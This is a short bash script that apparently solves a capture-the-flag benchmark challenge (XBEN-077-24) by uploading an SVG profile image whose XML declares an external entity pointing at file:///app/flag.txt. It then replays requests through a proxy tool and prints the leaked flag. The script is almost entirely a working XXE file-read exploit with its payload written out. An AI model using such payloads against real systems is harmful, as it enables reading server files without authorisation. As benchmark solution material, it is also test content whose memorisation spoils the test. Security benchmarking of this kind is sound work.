#!/usr/bin/env bash
# XBEN-077-24 — XXE via an uploaded SVG. Proxy-mode twin. The profile image is
# parsed as XML; an SVG declaring an external entity for the flag file embeds
# its contents, which the rendered profile then shows.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben077p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
XXE='<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]><svg>&xxe;</svg>'
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/' \
  --set 'multipart.name=a' --set 'multipart.surname=b' --set 'multipart.address=c' \
  --set "multipart.image=$XXE" \
  --set 'multipart.image.filename=profile.svg' --set 'multipart.image.content_type=image/svg+xml' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'method=GET' --set 'path=/' >/dev/null
print_flag
